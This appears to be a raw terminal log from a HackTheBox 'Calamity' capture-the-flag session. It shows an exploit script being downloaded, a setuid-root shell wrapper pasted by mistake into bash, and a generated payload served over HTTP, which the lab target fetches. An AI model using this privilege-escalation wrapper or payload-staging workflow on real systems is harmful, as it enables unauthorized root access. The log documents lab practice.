@@ -1,0 +1,50 @@
+root@parrot:~/hackthebox/calamity# wget https://raw.githubusercontent.com/piyush-saurabh/ctf/master/calamity.py -O calamity.py                                  
+--2020-01-15 07:05:09--  https://raw.githubusercontent.com/piyush-saurabh/ctf/master/calamity.py                                                                
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.20.133                                                                               
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.20.133|:443... connected.                                                           
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 477 [text/plain]                
+Saving to: ‘calamity.py’                
+
+calamity.py                             100%[===============================================================================>]     477  --.-KB/s    in 0.001s   
+
+2020-01-15 07:05:10 (580 KB/s) - ‘calamity.py’ saved [477/477]                  
+
+root@parrot:~/hackthebox/calamity# ls   
+calamity.gpr  calamity.py  calamity.rep  creds  goodluck  nmap  www  xalvas-files                                                                               
+root@parrot:~/hackthebox/calamity# wget #include <stdio.h>                      
+wget: missing URL                       
+Usage: wget [OPTION]... [URL]...        
+
+Try `wget --help' for more options.     
+root@parrot:~/hackthebox/calamity# #include <stdlib.h>                          
+root@parrot:~/hackthebox/calamity#      
+root@parrot:~/hackthebox/calamity# int main() {                                 
+-bash: syntax error near unexpected token `('                                   
+root@parrot:~/hackthebox/calamity# setuid(0);                                   
+-bash: syntax error near unexpected token `0'                                   
+root@parrot:~/hackthebox/calamity# setgid(0);                                   
+-bash: syntax error near unexpected token `0'                                   
+root@parrot:~/hackthebox/calamity# system("/bin/sh");                           
+-bash: syntax error near unexpected token `"/bin/sh"'                           
+root@parrot:~/hackthebox/calamity# }    
+-bash: syntax error near unexpected token `}'                                   
+root@parrot:~/hackthebox/calamity# wget https://raw.githubusercontent.com/piyush-saurabh/ctf/master/wrapper.c -O wrapper.c                                      
+--2020-01-15 07:06:06--  https://raw.githubusercontent.com/piyush-saurabh/ctf/master/wrapper.c                                                                  
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.156.133                                                                              
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.156.133|:443... connected.                                                          
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 99 [text/plain]                 
+Saving to: ‘wrapper.c’                  
+
+wrapper.c                               100%[===============================================================================>]      99  --.-KB/s    in 0s       
+
+2020-01-15 07:06:07 (198 MB/s) - ‘wrapper.c’ saved [99/99]                      
+
+root@parrot:~/hackthebox/calamity# ls   
+calamity.gpr  calamity.py  calamity.rep  creds  goodluck  nmap  wrapper.c  www  xalvas-files                                                                    
+root@parrot:~/hackthebox/calamity# python calamity.py > payload                 
+root@parrot:~/hackthebox/calamity# python -m SimpleHTTPServer                   
+Serving HTTP on 0.0.0.0 port 8000 ...   
+10.10.10.27 - - [15/Jan/2020 07:07:37] "GET /payload HTTP/1.1" 200 -            
+10.10.10.27 - - [15/Jan/2020 07:08:30] "GET /wrapper.c HTTP/1.1" 200 -          
